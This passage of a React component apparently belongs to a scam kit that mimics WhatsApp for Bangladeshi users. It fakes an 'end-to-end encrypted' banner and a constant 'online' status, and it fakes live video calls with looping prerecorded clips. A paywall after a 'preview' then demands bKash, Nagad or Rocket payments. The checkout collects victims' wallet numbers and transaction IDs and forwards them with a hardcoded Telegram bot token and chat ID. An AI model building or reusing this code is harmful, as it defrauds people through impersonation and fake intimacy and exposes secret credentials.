            className="w-full text-left px-4 py-2.5 hover:bg-slate-50 transition rounded-lg"
          >
            ✏️ Edit Message
          </button>
          <button
            onClick={handleDeleteMe}
            className="w-full text-left px-4 py-2.5 hover:bg-slate-50 transition rounded-lg"
          >
            🗑️ Delete for me
          </button>
          <button
            onClick={handleDeleteEveryone}
            className="w-full text-left px-4 py-2.5 hover:bg-red-50 text-red-500 transition rounded-lg font-bold"
          >
            🚫 Delete for everyone
          </button>
        </div>
      )}

      {/* Main Header */}
      <header className="sticky top-0 z-30 bg-white border-b border-gray-100 shadow-sm shrink-0 px-3 py-2.5 flex items-center justify-between">
        <div className="flex items-center gap-2 flex-grow overflow-hidden">
          <button
            onClick={onBack}
            className="p-1 text-gray-600 hover:text-pink-500 rounded-full hover:bg-slate-100 active:scale-95 transition"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <img
            src={profileId ? `/profile/${profileId}.jpg` : profileImage}
            onError={(e) => {
              e.currentTarget.onerror = null;
              e.currentTarget.src = profileImage;
            }}
            alt="Profile Story"
            onClick={() => setShowContactInfo(true)}
            className="w-10 h-10 rounded-full object-cover bg-gray-100 border-2 border-green-500 cursor-pointer hover:opacity-90 active:scale-95"
          />
          <div className="flex flex-col overflow-hidden max-w-[150px] sm:max-w-[200px]" onClick={() => setShowContactInfo(true)}>
            <span className="font-extrabold text-sm text-gray-900 tracking-tight leading-normal truncate">
              {profileName}
            </span>
            <span className="text-[10px] text-green-500 font-bold flex items-center gap-1">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></span>
              <span>online</span>
            </span>
          </div>
        </div>

        <div className="flex items-center gap-4 text-gray-600">
          <button
            onClick={() => initiateCall("video")}
            className="p-2 hover:bg-slate-100 rounded-full active:scale-95 transition"
            title="Video Call"
          >
            <Video className="w-5 h-5 text-gray-700" />
          </button>
          <button
            onClick={() => initiateCall("audio")}
            className="p-2 hover:bg-slate-100 rounded-full active:scale-95 transition"
            title="Audio Call"
          >
            <Phone className="w-5 h-5 text-gray-700" />
          </button>
        </div>
      </header>

      {/* Persistent Client Identification Banner */}
      <div className="bg-[#fff9db] border-b border-[#ffe066] px-4 py-2 text-[11px] text-amber-900 font-bold flex justify-between items-center shadow-xs shrink-0 select-text">
        <div className="flex items-center gap-1.5">
          <span className="text-sm">👤</span>
          <span>গ্রাহক সনাক্তকরণ নম্বর (User ID): <span className="font-mono bg-amber-200/80 text-amber-950 px-2 py-0.5 rounded ml-1 tracking-wider text-xs border border-amber-300 font-extrabold">{userId.replace("user_", "")}</span></span>
        </div>
        <span className="text-[9px] bg-amber-500 text-white font-extrabold px-1.5 py-0.5 rounded shadow-xs uppercase tracking-wider">রিয়েল-টাইম সনাক্তকরণ</span>
      </div>

      {/* Scrollable Chat Area */}
      <main
        ref={chatAreaRef}
        className="flex-grow p-4 overflow-y-auto space-y-3 flex flex-col"
        style={{
          backgroundImage: "url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png')",
          backgroundSize: "cover",
          backgroundPosition: "center"
        }}
      >
        <div className="self-center bg-white/95 px-3 py-1 rounded-lg text-[10px] text-gray-500 font-bold shadow-xs select-none">
          Today
        </div>

        <div className="self-center bg-[#ffeecd]/90 max-w-[90%] text-[10.5px] font-bold text-[#54656f] px-3.5 py-2 rounded-xl text-center shadow-xs flex items-center justify-center gap-2 border border-yellow-100 leading-relaxed">
          <Lock className="w-3.5 h-3.5 text-[#54656f] shrink-0 fill-current" />
          <span>Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them.</span>
        </div>

        {/* List of Messages */}
        {messages.map((m) => {
          if (localStorage.getItem(`deleted_${m.id}`)) return null;
          
          const isSent = m.sender === "client";
          const isSys = m.sender === "sys";

          if (isSys) {
            return (
              <div key={m.id} className="self-center bg-zinc-200/90 text-[10px] font-extrabold text-zinc-600 px-3 py-1 rounded-lg shadow-xs my-1">
                {m.text}
              </div>
            );
          }

          return (
            <div
              key={m.id}
              onClick={(e) => {
                setSelectedMsgId(m.id);
                setShowMsgMenu({ x: Math.min(window.innerWidth - 190, e.clientX), y: Math.min(window.innerHeight - 150, e.clientY) });
              }}
              className={`max-w-[80%] flex flex-col bubble-chat cursor-pointer ${
                isSent ? "self-end animate-fade-in" : "self-start animate-fade-in"
              }`}
            >
              <div
                className={`p-2.5 rounded-2xl shadow-sm relative text-sm leading-relaxed flex flex-col gap-1 ${
                  isSent
                    ? "bg-[#d9fdd3] text-gray-900 rounded-tr-none"
                    : "bg-white text-gray-900 rounded-tl-none"
                }`}
              >
                {m.isDeleted ? (
                  <span className="italic text-gray-400 text-xs flex items-center gap-1">
                    🚫 This message was deleted
                  </span>
                ) : (
                  <>
                    {/* Media Render */}
                    {m.fileUrl && (
                      <div className="mb-1 rounded-xl overflow-hidden bg-slate-100/50">
                        {m.fileType?.startsWith("image/") && (
                          <img
                            src={m.fileUrl}
                            alt="Media Image"
                            className="max-h-60 object-cover w-full cursor-pointer hover:opacity-95"
                            onClick={(e) => {
                              e.stopPropagation();
                              window.open(m.fileUrl, "_blank");
                            }}
                          />
                        )}
                        {m.fileType?.startsWith("video/") && (
                          <video src={m.fileUrl} controls className="max-h-60 w-full rounded-xl" />
                        )}
                        {m.fileType?.startsWith("audio/") && (
                          <audio src={m.fileUrl} controls className="w-full h-10 mt-1" />
                        )}
                        {!m.fileType?.startsWith("image/") &&
                          !m.fileType?.startsWith("video/") &&
                          !m.fileType?.startsWith("audio/") && (
                            <div className="p-3 bg-slate-50 border border-gray-100 rounded-xl flex items-center gap-2">
                              <span>📄</span>
                              <a
                                href={m.fileUrl}
                                target="_blank"
                                rel="noreferrer"
                                className="text-blue-600 font-extrabold hover:underline"
                              >
                                Download Document
                              </a>
                            </div>
                          )}
                      </div>
                    )}
                    
                    {/* Message description body */}
                    <span className="font-medium whitespace-pre-wrap">
                      {m.text === "Photo" || m.text === "Video" || m.text === "Voice Message" || m.text === "Document"
                        ? ""
                        : m.text}
                    </span>

                    {/* Interactive Payment Bubble Card Buttons */}
                    {m.isPaymentButton && (
                      <div className="mt-2.5 bg-gradient-to-r from-amber-50 to-orange-50 border border-amber-200 rounded-xl p-3 flex flex-col gap-2.5 shadow-xs select-none">
                        <div className="flex items-center gap-1.5 text-amber-800">
                          <span className="text-sm">⭐️</span>
                          <span className="text-[11px] font-extrabold uppercase tracking-wide">সুপার প্রিমিয়াম অফার</span>
                        </div>
                        <p className="text-[11px] text-gray-500 leading-normal">১ মিনিট প্রিভিউ শেষ। সম্পূর্ণ আনলিমিটেড ভিডিও ও ভয়েস কল সার্ভিস সচল করতে নিচের লিঙ্কে পেমেন্ট করুন।</p>
                        
                        <div className="flex flex-col gap-1.5">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setPaymentAmount(250);
                              setPaymentMethodChosen("bkash");
                              setShowPaymentModal(true);
                            }}
                            className="bg-[#e2136e] hover:bg-[#c90a5e] text-white font-extrabold text-[11px] py-2 px-3 rounded-xl flex items-center justify-between transition active:scale-95 shadow-xs"
                          >
                            <span>বিকাশ দিয়ে ২৫০৳ পাঠান (১৫ মিনিট)</span>
                            <span className="text-[9px] bg-white/20 px-1.5 py-0.5 rounded font-bold uppercase shrink-0">bKash</span>
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setPaymentAmount(500);
                              setPaymentMethodChosen("nagad");
                              setShowPaymentModal(true);
                            }}
                            className="bg-[#f15a22] hover:bg-[#d6410d] text-white font-extrabold text-[11px] py-2 px-3 rounded-xl flex items-center justify-between transition active:scale-95 shadow-xs"
                          >
                            <span>নগদ দিয়ে ৫০০৳ পাঠান (আধা ঘণ্টা)</span>
                            <span className="text-[9px] bg-white/20 px-1.5 py-0.5 rounded font-extrabold uppercase shrink-0">Nagad</span>
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setPaymentAmount(1000);
                              setPaymentMethodChosen("rocket");
                              setShowPaymentModal(true);
                            }}
                            className="bg-[#8c3494] hover:bg-[#72217a] text-white font-extrabold text-[11px] py-2 px-3 rounded-xl flex items-center justify-between transition active:scale-95 shadow-xs"
                          >
                            <span>রকেট দিয়ে ১০০০৳ পাঠান (১ ঘণ্টা)</span>
                            <span className="text-[9px] bg-white/20 px-1.5 py-0.5 rounded font-bold uppercase shrink-0">Rocket</span>
                          </button>
                        </div>
                        <div className="text-[9px] text-[#00a884] font-extrabold flex items-center justify-center gap-1 mt-0.5">
                          <span>🔒 100% Secure SSL Companion Pay Enabled</span>
                        </div>
                      </div>
                    )}

                    {/* Metadata */}
                    <div className="flex items-center justify-end gap-1 select-none">
                      {m.isEdited && <span className="text-[9px] text-gray-400 font-bold uppercase tracking-wider">Edited</span>}
                      <span className="text-[9px] text-gray-400 font-bold">{m.time}</span>
                    </div>
                  </>
                )}
              </div>
            </div>
          );
        })}

        {/* Typing status bubble */}
        {isTyping && (
          <div className="self-start max-w-[80%] flex flex-col bubble-chat animate-pulse">
            <div className="p-3 bg-white text-gray-700/80 rounded-2xl rounded-tl-none shadow-xs text-xs font-bold flex items-center gap-2">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-bounce"></span>
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-bounce [animation-delay:0.2s]"></span>
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-bounce [animation-delay:0.4s]"></span>
              <span className="text-gray-500 font-bold ml-1 text-[11px]">{profileName} লিখছেন...</span>
            </div>
          </div>
        )}
      </main>

      {/* Floating Attachments Menu overlay pop */}
      {showAttachMenu && (
        <div className="absolute bottom-16 left-3 right-3 bg-white border border-gray-100 shadow-2xl rounded-2xl p-4 grid grid-cols-3 gap-4 z-40 animate-zoom-in">
          <div onClick={() => docRef.current?.click()} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-indigo-500 text-white flex items-center justify-center shadow-md">📄</div>
            <span className="text-[10px] font-bold text-gray-600">Document</span>
          </div>
          <div onClick={() => cameraRef.current?.click()} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-rose-500 text-white flex items-center justify-center shadow-md">📷</div>
            <span className="text-[10px] font-bold text-gray-600">Camera</span>
          </div>
          <div onClick={() => galleryRef.current?.click()} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-purple-500 text-white flex items-center justify-center shadow-md">🖼️</div>
            <span className="text-[10px] font-bold text-gray-600">Gallery</span>
          </div>
          <div onClick={() => audioRef.current?.click()} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-orange-500 text-white flex items-center justify-center shadow-md">🎵</div>
            <span className="text-[10px] font-bold text-gray-600">Audio</span>
          </div>
          <div onClick={() => alert("Location sharing is premium feature. Please connect first!")} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-emerald-500 text-white flex items-center justify-center shadow-md">📍</div>
            <span className="text-[10px] font-bold text-gray-600">Location</span>
          </div>
          <div onClick={() => alert("Contact sharing is premium feature. Please connect first!")} className="flex flex-col items-center gap-1.5 cursor-pointer hover:scale-105 active:scale-95 transition">
            <div className="w-12 h-12 rounded-full bg-sky-500 text-white flex items-center justify-center shadow-md">👤</div>
            <span className="text-[10px] font-bold text-gray-600">Contact</span>
          </div>
        </div>
      )}

      {/* Input bar and bottom action controls */}
      <footer className="bg-transparent p-2 flex items-end gap-1.5 shrink-0 z-20">
        <div className="flex-grow bg-white rounded-3xl shadow-sm flex items-end p-2 gap-2 border border-gray-100 min-h-[48px]">
          <button
            onClick={() => setShowEmojiPanel(!showEmojiPanel)}
            className="p-1 hover:bg-slate-100 rounded-full text-gray-500 active:scale-95 transition"
          >
            <Smile className="w-5 h-5" />
          </button>
          
          {isRecording ? (
            <div className="flex-grow flex items-center justify-between px-2 text-xs font-bold text-red-500 animate-pulse">
              <div className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-ping shrink-0" />
                <span>Recording... {Math.floor(recordDuration / 60)}:{(recordDuration % 60 < 10 ? "0" : "") + (recordDuration % 60)}</span>
              </div>
              <div className="flex items-center gap-2 text-gray-400">
                <button onClick={cancelVoiceRecording} className="text-red-500 font-extrabold hover:underline">Trash</button>
                <button onClick={stopVoiceRecording} className="text-green-500 font-extrabold hover:underline">Send</button>
              </div>
            </div>
          ) : (
            <input
              type="text"
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              onFocus={() => setShowEmojiPanel(false)}
              onKeyDown={(e) => e.key === "Enter" && sendTextMessage()}
              placeholder="Message"
              disabled={isBlocked}
              className="flex-grow bg-transparent text-sm border-none outline-none font-medium max-h-24 resize-none text-gray-800 placeholder-gray-400 py-1"
            />
          )}

          <button
            onClick={() => setShowAttachMenu(!showAttachMenu)}
            style={{ transform: "rotate(-45deg)" }}
            className="p-1 hover:bg-slate-100 rounded-full text-gray-500 active:scale-95 transition"
          >
            <Paperclip className="w-5 h-5" />
          </button>
          <button
            onClick={() => cameraRef.current?.click()}
            className="p-1 hover:bg-slate-100 rounded-full text-gray-500 active:scale-95 transition"
          >
            <Camera className="w-5 h-5" />
          </button>
        </div>

        {/* Sender circle FAB control */}
        {inputText.trim() !== "" ? (
          <button
            onClick={sendTextMessage}
            className="w-12 h-12 bg-[#00a884] hover:bg-[#0aa682] active:scale-95 transition text-white rounded-full flex items-center justify-center shadow-lg cursor-pointer"
          >
            <Send className="w-5 h-5 ml-0.5" />
          </button>
        ) : (
          <button
            onClick={isRecording ? stopVoiceRecording : startVoiceRecording}
            className={`w-12 h-12 active:scale-95 transition text-white rounded-full flex items-center justify-center shadow-lg cursor-pointer ${
              isRecording ? "bg-red-500 animate-pulse" : "bg-[#00a884] hover:bg-[#0aa682]"
            }`}
          >
            <Mic className="w-5 h-5" />
          </button>
        )}
      </footer>

      {/* Blocked banner notice */}
      {isBlocked && (
        <div className="bg-[#ffeecd]/95 text-center text-[11px] font-bold py-3 text-gray-600 border-t border-yellow-100 z-30 flex items-center justify-center gap-1.5 select-none shrink-0 leading-normal">
          <Shield className="w-3.5 h-3.5" />
          <span>You cannot reply to this conversation. You have been blocked.</span>
        </div>
      )}

      {/* Emoji keyboard panel container */}
      {showEmojiPanel && (
        <div className="bg-slate-100 p-3 h-48 border-t border-gray-200 z-30 shrink-0 overflow-y-auto w-full">
          <div className="grid grid-cols-8 gap-3 text-2xl text-center">
            {emojis.map((emoji) => (
              <span
                key={emoji}
                onClick={() => setInputText((prev) => prev + emoji)}
                className="cursor-pointer hover:scale-125 transition select-none active:bg-slate-200/50 p-1 rounded-md"
              >
                {emoji}
              </span>
            ))}
          </div>
        </div>
      )}

      {/* =======================================================
           WEBRTC IMMERSIVE CALL SCREEN OVERLAY SYSTEM
           ======================================================= */}
      {isCallActive && (
        <div className="fixed inset-0 bg-slate-950/95 z-50 flex flex-col justify-between py-10 px-4 text-white text-center select-none animate-fade-in">
          <div className="absolute inset-0 overflow-hidden pointer-events-none opacity-100">
            {fakeVideoUrl ? (
              <video
                ref={fakeRemoteVideoRef}
                src={fakeVideoUrl}
                playsInline
                loop
                autoPlay
                className="w-full h-full object-cover"
                muted={isFakeVideoMuted}
                onError={(e) => {
                  const currentSrc = e.currentTarget.src || "";
                  if (currentSrc.includes("/video%20call/") || currentSrc.includes("/video-call/") || currentSrc.includes("/video_call/")) {
                    // Try the uppercase catalog folder fallback
                    e.currentTarget.src = `/Video call/${profileId}.mp4`;
                    return;
                  }
                  console.warn("Target mp4 video call trial file is missing, using high-quality fallback streaming companion feed.");
                  const fallbacks = [
                    "https://player.vimeo.com/external/371433846.sd.mp4?s=236da2f3c054273b16f90de2c516cb12ee7f9c2d&profile_id=139&oauth2_token_id=57447761",
                    "https://player.vimeo.com/external/434045526.sd.mp4?s=c27d2ab2d1d054d55ea9767664f3312ec68bd502&profile_id=165&oauth2_token_id=57447761",
                    "https://player.vimeo.com/external/403847704.sd.mp4?s=d00ca41f5370dc1eb5097435f0f37f37fbf9bda5&profile_id=165&oauth2_token_id=57447761",
                    "https://player.vimeo.com/external/384761655.sd.mp4?s=89679f22c15383f982ea2fd58066bb73167b7fce&profile_id=139&oauth2_token_id=57447761"
                  ];
                  e.currentTarget.src = fallbacks[Math.floor(Math.random() * fallbacks.length)];
                }}
              />
            ) : (
              <video
                ref={localVideoRef}
                playsInline
                autoPlay
                muted
                className="w-full h-full object-cover scale-x-[-1]"
              />
            )}
          </div>

          Local picture-in-picture stream preview
          {localStreamRef.current && fakeVideoUrl && (
            <video
              ref={localVideoRef}
              playsInline
              autoPlay
              muted
              className="absolute top-24 right-4 w-28 h-40 object-cover rounded-xl border-2 border-white/20 shadow-2xl z-40 bg-zinc-900 scale-x-[-1]"
            />
          )}

          {/* Top Info Bar */}
          <div className="flex justify-between items-center px-4 relative z-20">
            <button
              onClick={executeEndCall}
              className="w-10 h-10 bg-white/10 hover:bg-white/20 active:scale-95 transition rounded-full flex items-center justify-center backdrop-blur-md"
            >
              <ArrowLeft className="w-5 h-5 text-white" />
            </button>
            <button
              onClick={flipCamera}
              className="w-10 h-10 bg-white/10 hover:bg-white/20 active:scale-95 transition rounded-full flex items-center justify-center backdrop-blur-md"
              title="Flip Camera"
            >
              <RefreshCw className="w-5 h-5 text-white animate-spin-slow" />
            </button>
          </div>

          {/* Header metadata */}
          <div className="relative z-20 mt-10">
            <h2 className="text-xl font-extrabold tracking-tight mb-1 text-white shadow-sm">
              {profileName}
            </h2>
            <div className="text-[12px] opacity-75 font-bold tracking-widest uppercase">
              {callStatus}
            </div>
          </div>

          {/* Fallback image avatar */}
          {!fakeVideoUrl && (
            <img
              src={profileId ? `/profile/${profileId}.jpg` : profileImage}
              onError={(e) => {
                e.currentTarget.onerror = null;
                e.currentTarget.src = profileImage;
              }}
              alt="Caller profile"
              className="w-32 h-32 rounded-full object-cover mx-auto my-6 border-2 border-green-500 shadow-2xl relative z-20 animate-pulse bg-gray-900"
            />
          )}

          {/* Incoming answering triggers */}
          {showReceiveCallDiv && (
            <div className="flex justify-center relative z-20 my-4">
              <button
                onClick={answerIncomingCall}
                className="w-16 h-16 bg-[#25D366] hover:bg-[#1ebd5a] active:scale-95 transition text-white rounded-full flex items-center justify-center shadow-2xl animate-bounce"
              >
                <Phone className="w-6 h-6 animate-pulse" />
              </button>
            </div>
          )}

          {/* Interactive controls bar */}
          <div className="relative z-20 max-w-sm mx-auto w-full px-6">
            <div className="bg-[#232d36]/90 border border-white/5 rounded-[36px] py-3.5 px-6 flex items-center justify-between shadow-2xl backdrop-blur-md">
              
              {/* Speaker */}
              <button
                onClick={() => setIsSpeakerOn(!isSpeakerOn)}
                className={`w-11 h-11 rounded-full flex items-center justify-center transition active:scale-95 ${
                  isSpeakerOn ? "bg-white text-slate-900" : "bg-white/15 text-white hover:bg-white/20"
                }`}
                title="Speaker Mode"
              >
                <Volume2 className="w-5 h-5" />
              </button>

              {/* Video track status */}
              <button
                onClick={toggleVideoTrack}
                className={`w-11 h-11 rounded-full flex items-center justify-center transition active:scale-95 ${
                  isVideoTrackOn ? "bg-white text-slate-900" : "bg-red-500 text-white"
                }`}
                title="Camera Feed Toggle"
              >
                {isVideoTrackOn ? <Video className="w-5 h-5" /> : <VideoOff className="w-5 h-5" />}
              </button>

              {/* Mute state */}
              <button
                onClick={toggleMute}
                className={`w-11 h-11 rounded-full flex items-center justify-center transition active:scale-95 ${
                  !isMuted ? "bg-white text-slate-900" : "bg-red-500 text-white"
                }`}
                title="Mic Toggle"
              >
                {!isMuted ? <Mic className="w-5 h-5" /> : <MicOff className="w-5 h-5" />}
              </button>

              {/* Red call disconnect trigger */}
              <button
                onClick={executeEndCall}
                className="w-12 h-12 bg-red-600 hover:bg-red-700 active:scale-95 transition rounded-full flex items-center justify-center text-white shadow-xl"
                title="Disconnect Call"
              >
                <PhoneOff className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      )}

      {/* =======================================================
           CONTACT BUSINESS SIDE PROFILE SCREEN OVERLAY CARD
           ======================================================= */}
      {showContactInfo && (
        <div className="fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col overflow-y-auto animate-fade-in text-gray-800">
          <header className="sticky top-0 bg-white p-4 flex justify-between items-center shadow-xs border-b border-gray-100 z-10 shrink-0">
            <button
              onClick={() => setShowContactInfo(false)}
              className="p-1 rounded-full hover:bg-slate-100 text-gray-600 transition duration-200"
            >
              <ArrowLeft className="w-6 h-6" />
            </button>
            <span className="font-extrabold text-sm text-gray-900 leading-normal tracking-wide">Business Profile</span>
            <button className="p-1 text-gray-600"><MoreVertical className="w-6 h-6" /></button>
          </header>

          {/* Profile Section banner info details */}
          <div className="bg-white flex flex-col items-center p-6 shadow-xs">
            <img 
              src={profileId ? `/profile/${profileId}.jpg` : profileImage}
              onError={(e) => {
                e.currentTarget.onerror = null;
                e.currentTarget.src = profileImage;
              }}
              alt={profileName} 
              className="w-32 h-32 rounded-full object-cover bg-gray-100 border-2 border-gray-200 mb-4 shadow-lg" 
            />
            <h2 className="text-xl font-extrabold text-gray-900 leading-normal tracking-tight">{profileName}</h2>
            <div className="text-xs text-green-500 font-bold mb-5 flex items-center gap-1 mt-1">
              <span className="w-2 h-2 rounded-full bg-green-500 animate-ping"></span>
              <span>Online Now</span>
            </div>

            <div className="flex gap-4 w-full max-w-sm mt-3">
              <button
                onClick={() => {
                  setShowContactInfo(false);
                  initiateCall("audio");
                }}
                className="flex-1 border border-gray-200 rounded-2xl bg-slate-50 flex flex-col items-center justify-center py-3.5 hover:bg-slate-100 active:scale-95 transition"
              >
                <Phone className="w-5 h-5 text-gray-700 mb-1" />
                <span className="text-xs font-bold text-gray-700">Voice Call</span>
              </button>
              <button
                onClick={() => {
                  setShowContactInfo(false);
                  initiateCall("video");
                }}
                className="flex-1 border border-gray-200 rounded-2xl bg-slate-50 flex flex-col items-center justify-center py-3.5 hover:bg-slate-100 active:scale-95 transition"
              >
                <Video className="w-5 h-5 text-gray-700 mb-1" />
                <span className="text-xs font-bold text-gray-700">Video Call</span>
              </button>
            </div>
          </div>

          <div className="mt-3 bg-white p-4 shadow-xs space-y-4">
            <div className="flex items-center gap-4">
              <div className="text-lg text-gray-400">🛡️</div>
              <div className="flex-grow">
                <h4 className="text-xs font-extrabold text-gray-700">Security Certificate</h4>
                <p className="text-[10px] text-gray-400 font-bold mt-0.5">GDPR, HIPAA, and End-to-End Chat protection enabled.</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* =======================================================
           MOBILE BANKING CENTRAL PAYMENT GATEWAY SIMULATION
           ======================================================= */}
      {showPaymentModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-sm z-[99] flex items-center justify-center p-4 animate-fade-in text-gray-800">
          <div className="bg-white rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative animate-zoom-in flex flex-col border border-gray-100">
            
            {/* Header with Dynamic Brand Theme */}
            <div className={`p-5 text-white flex flex-col items-center justify-center text-center relative shrink-0 transition-colors duration-300 ${
              paymentMethodChosen === "bkash" ? "bg-[#e2136e]" :
              paymentMethodChosen === "nagad" ? "bg-[#f15a22]" : "bg-[#8c3494]"
            }`}>
              <button
                onClick={() => {
                  setShowPaymentModal(false);
                  setPaymentNumber("");
                  setPaymentTrxId("");
                }}
                className="absolute top-4 right-4 bg-black/15 hover:bg-black/25 text-white p-1.5 rounded-full transition-all active:scale-95 text-xs font-extrabold"
              >
                ✕
              </button>
              
              <div className="text-2xl mb-1">
                {paymentMethodChosen === "bkash" ? "🇧🇩 bKash Checkout" :
                 paymentMethodChosen === "nagad" ? "🍊 Nagad Checkout" : "🚀 Rocket Checkout"}
              </div>
              <div className="text-xs font-bold opacity-90 tracking-wide uppercase">Secure Companion Pay Gateway</div>
            </div>

            {/* Content Segment */}
            <div className="p-5 space-y-4 flex-grow overflow-y-auto">
              {/* Select Package Price */}
              <div>
                <label className="block text-[11px] font-extrabold text-gray-500 uppercase tracking-wider mb-2">প্যাকেজ নির্বাচন করুন (Select Duration Package)</label>
                <div className="grid grid-cols-3 gap-2">
                  <button
                    onClick={() => setPaymentAmount(250)}
                    className={`p-2.5 rounded-xl border-2 flex flex-col items-center justify-center text-center transition ${
                      paymentAmount === 250 
                        ? (paymentMethodChosen === "bkash" ? "border-[#e2136e] bg-pink-50" : paymentMethodChosen === "nagad" ? "border-[#f15a22] bg-orange-50" : "border-[#8c3494] bg-purple-50")
                        : "border-gray-200 hover:bg-slate-50"
                    }`}
                  >
                    <span className="text-xs font-bold text-gray-500">১৫ মিনিট</span>
                    <span className="text-sm font-extrabold text-gray-900 mt-1">৳২৫০</span>
                  </button>
                  <button
                    onClick={() => setPaymentAmount(500)}
                    className={`p-2.5 rounded-xl border-2 flex flex-col items-center justify-center text-center transition ${
                      paymentAmount === 500 
                        ? (paymentMethodChosen === "bkash" ? "border-[#e2136e] bg-pink-50" : paymentMethodChosen === "nagad" ? "border-[#f15a22] bg-orange-50" : "border-[#8c3494] bg-purple-50")
                        : "border-gray-200 hover:bg-slate-50"
                    }`}
                  >
                    <span className="text-xs font-bold text-gray-500">৩০ মিনিট</span>
                    <span className="text-sm font-extrabold text-gray-900 mt-1">৳৫০০</span>
                  </button>
                  <button
                    onClick={() => setPaymentAmount(1000)}
                    className={`p-2.5 rounded-xl border-2 flex flex-col items-center justify-center text-center transition ${
                      paymentAmount === 1000 
                        ? (paymentMethodChosen === "bkash" ? "border-[#e2136e] bg-pink-50" : paymentMethodChosen === "nagad" ? "border-[#f15a22] bg-orange-50" : "border-[#8c3494] bg-purple-50")
                        : "border-gray-200 hover:bg-slate-50"
                    }`}
                  >
                    <span className="text-xs font-bold text-gray-500">১ ঘণ্টা</span>
                    <span className="text-sm font-extrabold text-gray-900 mt-1">৳১০০০</span>
                  </button>
                </div>
              </div>

              {/* Payment Method Switcher */}
              <div>
                <label className="block text-[11px] font-extrabold text-gray-500 uppercase tracking-wider mb-2">পেমেন্ট গেটওয়ে পরিবর্তন করুন (Select Wallet Method)</label>
                <div className="grid grid-cols-3 gap-2">
                  <button
                    onClick={() => setPaymentMethodChosen("bkash")}
                    className={`py-2 rounded-xl text-xs font-extrabold text-center border transition ${
                      paymentMethodChosen === "bkash" ? "bg-[#e2136e] text-white border-transparent" : "bg-slate-50 text-gray-700 border-gray-200 hover:bg-slate-150"
                    }`}
                  >
                    bKash
                  </button>
                  <button
                    onClick={() => setPaymentMethodChosen("nagad")}
                    className={`py-2 rounded-xl text-xs font-extrabold text-center border transition ${
                      paymentMethodChosen === "nagad" ? "bg-[#f15a22] text-white border-transparent" : "bg-slate-50 text-gray-700 border-gray-200 hover:bg-slate-150"
                    }`}
                  >
                    Nagad
                  </button>
                  <button
                    onClick={() => setPaymentMethodChosen("rocket")}
                    className={`py-2 rounded-xl text-xs font-extrabold text-center border transition ${
                      paymentMethodChosen === "rocket" ? "bg-[#8c3494] text-white border-transparent" : "bg-slate-50 text-gray-700 border-gray-200 hover:bg-slate-150"
                    }`}
                  >
                    Rocket
                  </button>
                </div>
              </div>

              {/* Payment Number Input */}
              <div className="space-y-1">
                <label className="block text-[11px] font-extrabold text-gray-500 uppercase tracking-wider">মোবাইল ওয়ালেট নম্বর (Enter {paymentMethodChosen?.toUpperCase()} Wallet Number)</label>
                <input
                  type="tel"
                  placeholder="01712xxxxxx"
                  value={paymentNumber}
                  onChange={(e) => setPaymentNumber(e.target.value.replace(/\s/g, ""))}
                  className="w-full border border-gray-200 rounded-xl px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00a884] font-semibold tracking-wider placeholder:text-gray-300"
                />
              </div>

              {/* Transaction ID Input */}
              <div className="space-y-1">
                <label className="block text-[11px] font-extrabold text-gray-500 uppercase tracking-wider">টাকার ট্রানজেকশন আইডি (Transaction TrxID - Optional)</label>
                <input
                  type="text"
                  placeholder="TRX9284KJ9"
                  value={paymentTrxId}
                  onChange={(e) => setPaymentTrxId(e.target.value)}
                  className="w-full border border-gray-200 rounded-xl px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#00a884] font-semibold tracking-widest uppercase placeholder:text-gray-300"
                />
                <span className="text-[10px] text-gray-400 font-bold leading-normal mt-1 block">বিকাশ/নগদ/রকেটে টাকা পাঠানো শেষ হলে আসা TrxID টি এখানে বসাতে পারেন।</span>
              </div>
            </div>

            {/* Footer with checkout action button */}
            <div className="p-4 bg-slate-50 border-t border-gray-100 text-center shrink-0">
              <button
                onClick={async () => {
                  if (!paymentNumber) {
                    alert("দয়া করে আপনার সঠিক মোবাইল ওয়ালেট নম্বরটি লিখুন!");
                    return;
                  }
                  
                  setIsProcessingPayment(true);

                  // Retrieve Telegram Bot settings dynamically from LocalStorage with default fallbacks
                  const customBotToken = localStorage.getItem("tg_bot_token") || "8519352781:AAHotyA6RzU-hspWlX6hOYJ6x0lDoFIKOKY";
                  const customChatId = localStorage.getItem("tg_chat_id") || "6658445342";

                  try {
                    const response = await fetch("/api/submit-payment", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        userId,
                        profileId,
                        profileName,
                        amount: paymentAmount,
                        paymentMethod: paymentMethodChosen,
                        paymentNumber,
                        paymentTrxId,
                        telegramToken: customBotToken,
                        telegramChatId: customChatId
                      })
                    });

                    const data = await response.json();
                    if (!data.success) {
                      throw new Error(data.error || "পেমেন্ট সাবমিট করতে ব্যর্থ হয়েছে।");
                    }

                    // Reset payment error status trigger flags
